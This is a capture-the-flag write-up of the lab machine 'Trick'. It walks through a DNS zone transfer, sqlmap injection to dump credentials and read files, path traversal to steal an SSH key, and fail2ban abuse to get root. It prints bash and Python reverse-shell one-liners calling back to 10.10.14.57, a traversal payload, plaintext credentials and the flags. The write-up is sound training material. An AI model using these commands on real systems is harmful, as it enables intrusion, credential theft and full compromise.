
## CTF Writeup: Trick

--- 
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.227.180
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-25 15:28 -0500
Nmap scan report for 10.129.227.180
Host is up (0.031s latency).
Not shown: 65531 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 362.46 seconds
```

The TCP Scan revealed SSH, SMTP, DNS & an nginx webservice running on port 80.

I decided to first find out the domain name, by conducting an reverse dns lookup.

```
nslookup 10.129.227.180 10.129.227.180
180.227.129.10.in-addr.arpa     name = trick.htb.
```

Mapped the domainname to the target ip address in our local dns file.

```
echo "10.129.227.180 trick.htb" | tee -a /etc/hosts
```

Decided to checkout the webservice. It looks like an unfinished page.

Proceeded with enumerating endpoints using an feroxbuster scan, but wasn't able to retrieve anything useful.

```
feroxbuster --url http://trick.htb
```

Continued enumerating subdomains using ffuf. But this also didn't provide anything useful.

```
ffuf -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://trick.htb -H "Host: FUZZ.trick.htb" -fs 5480
```

Since I was stuck here, I had to lookup and found out that TCP 53 is not seen on DNS servers as often (except for Windows DC's). One of the main reasons to use TCP is to do a zone transfer, asking the DNS server for all the records related to a given “zone” (such as trick.htb). To do a zone transfer, I’ll give dig the axfr options:

```
dig +noall +answer @10.129.227.180 axfr trick.htb
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
```

We now retrieved two new subdomains:

```
root.trick.htb
preprod-payroll.trick.htb
```

Added them into our local dns file.

```
mousepad /etc/hosts
10.129.227.180 trick.htb preprod-payroll.trick.htb root.trick.htb
```

Inspecting the preprod-payroll.trick.htb subdomain in the browser was promising. We got redirected to an /login.php endpoint.

```
http://preprod-payroll.trick.htb/
```

Let's capture the network package of an login attempt inside our web proxy tool BurpSuite, so we can save the network package inside an sql.req on our local machine, so we can execute sqlmap and check for SQL Injection inside the login parameters.

Stored the network package login request inside an sql.req on my local machine and ran the following command with sqlmap:

```
sqlmap -r sql.req --batch --dbs
```

sqlmap identified an SQL Injection in the username parameter and listed all databases. There is an non-default database called "payroll-db". Let's enumerate it's tables!

```
sqlmap -r sql.req --batch -D payroll_db --tables
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
```

Let's check what's inside the users table.

```
sqlmap -r sql.req --batch -D payroll_db -T users --dump
```

We gained credentials which seem to be working for the CMS.

```
Enemigosss:SuperGucciRainbowCake
```

Inspecting the "Employee List" Tab reveals information about an potential existing user called "john".

I was stuck here, so I had to research. Apparently we can enumerate the filesystem utilizing sqlmap aswell!!! Which I didn't know was possible.

This took a lot of time, but in the end provided us with the passwd file.

```
sqlmap -r sql.req --risk 3 --level 5 --technique=BEU --batch --file-read=/etc/passwd
```

This provided us with information about an existing user called "michael" on the target server.

Also enumerated privileges of our current sql user, this displayed the username "remo" and also that he has FILE  permissions, which allows us reading files.

```
sqlmap -r sql.req --privileges --batch
[*] remo [1]:
    privilege: FILE
```

Tried retrieving ssh key of the previously enumerated user "michael", but didn't work. Could be because we are lacking permissions.

```
sqlmap -r sql.req --risk 3 --level 5 --technique=BEU --batch --file-read=/home/michael/.ssh/id_rsa
```

I proceeded with enumerating the nginx configuration file to potentially get more information about the system.

```
sqlmap -r sql.req --risk 3 --level 5 --technique=BEU --batch --file-read=/etc/nginx/sites-enabled/default
```

The file says that the nginx webserver hosts 3 domains, we know about two but there is a third called "preprod-marketing.trick.htb". Let's map it to the target ip address in our local dns file.

```
mousepad /etc/hosts
10.129.227.180 trick.htb preprod-payroll.trick.htb root.trick.htb preprod-marketing.trick.htb
```

Inspecting the webpage seems like it's also very unpolished and unfinished, but the URL shows us an page= parameter which represents files stored inside the web-root. Let's try & access files outside of the webroot to potentially find an path traversal vulnerability / LFI. I tested multiple methods and this one worked for me:

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd
```

Since we previously enumerated user michael, let's actually try & get his private ssh key, since ssh is activated. We successfully retrieved the private ssh key of user michael, I stored it inside an id_rsa file.

```
curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa -o id_rsa
```

I also made sure that the private ssh key has limited permissions on my local machine, otherwise ssh protocol will be annoyed.

```
chmod 600 id_rsa
```

Connected to the target system using SSH.

```
ssh -i id_rsa michael@trick.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
```

Retrieved user.txt in /home/michael directory.

```
b774c8d3b5a137f9c281afb740049833
```

Enumerated his sudo permissions and saw he can restart the fail2ban service 

```
sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Enumerated our current user's group and saw that he seems to be part of the security group, which is kinda interesting.

```
id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

Let's enumerate directories and files owned by this group, to see what we can do.

```
find / -group security 2>/dev/null
/etc/fail2ban/action.d
```

This was interesting, because it revealed just one directory and it's corrolated to the fail2ban service for which we have sudo permissions!

A quick research revealed that this seems to be the directory where the fail2ban service is storing files / actions it will execute.

Bingo! If we add an malicious bash script inside it should be getting executed with sudo permissions, since we'll restart the fail2ban service with sudo permissions.

```
nano malicious.sh
```

Added the following code inside it.

```
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.57/80 0>&1'
```

Gave the bash script executable permissions.

```
chmod +x malicious.sh
```

Started up my listener on port 80 on my local machine.

```
nc -lvnp 80
```

Executed fail2ban restart with sudo permissions, but this didn't seem to work.

```
sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

Inspecting the directory actually reveals information that there is mainly .conf files stored and one smtp.py script. Let's actually try & add an python reverse shell, instead of an bash script.

```
/etc/fail2ban/action.d
```

I just also realised that there seems to be an cleanup script in place or whenever we restart the service it deletes all files besides some whitelisted files. Let's try & add an malicious .py script which executes an bash one-liner to connect to our local listener back.

Changed the name of the original smtp.py.

```
mv smtp.py smtp-backup.py
```

Created an malicious smtp.py and utilized the following code:

```
import os

os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.57/80 0>&1'")
```

Gave it executable permissions.

```
chmod 600 smtp.py
```

Restarted the fail2ban service again with sudo permissions, but it still didn't execute our payload.

From here on I had to research again to privesc.

##### Abusing fail2ban

1. Creating bash reverse shell in /tmp directory.

```
cd /tmp
nano shell.sh
#!bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.57/80 0>&1'
```

2. Give it executable permissions

```
chmod +x shell.sh
```

3. Granting us write permissions over the iptables-multiport.conf file.

Inside there is the important actioban parameter which we'll leverage to execute our payload.

```
mv iptables-multiport.conf iptables-multiport.conf.bak
cp iptables-multiport.conf.bak iptables-multiport.conf
nano iptables-multiport.conf
```

4. Started up my local listener

```
nc -lvnp 80
```

5. Modified the actionban parameter.

```
actionban = /tmp/shell.sh
```

6. Restarting fail2ban service with sudo permissions.

```
sudo /etc/init.d/fail2ban restart
```

7. Triggered fail2ban actionban parameter using nxc.

```
nxc ssh 10.129.227.180 -u michael -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

Gained RCE as user "root".

```
nc -lvnp 80                           
listening on [any] 80 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.227.180] 53522
bash: cannot set terminal process group (7225): Inappropriate ioctl for device
bash: no job control in this shell
root@trick:/#
```

Retrieved root.txt in /root directory.

```
27d811e33ab1cec9aa46d2b7dbd7225b
```